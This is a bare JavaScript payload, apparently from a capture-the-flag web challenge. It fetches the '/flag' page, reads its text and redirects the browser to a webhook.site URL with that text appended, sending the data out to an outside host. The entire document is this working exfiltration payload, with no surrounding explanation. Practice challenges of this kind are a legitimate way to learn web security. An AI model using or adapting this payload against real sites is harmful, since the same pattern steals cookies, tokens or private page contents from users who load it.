fetch('/flag').then((res) => {
    res.text().then((test) => {
        window.location.href = `https://webhook.site/0180e0d8-d1c0-4471-acae-2c98c51d7eb8/${test}`;
    })
})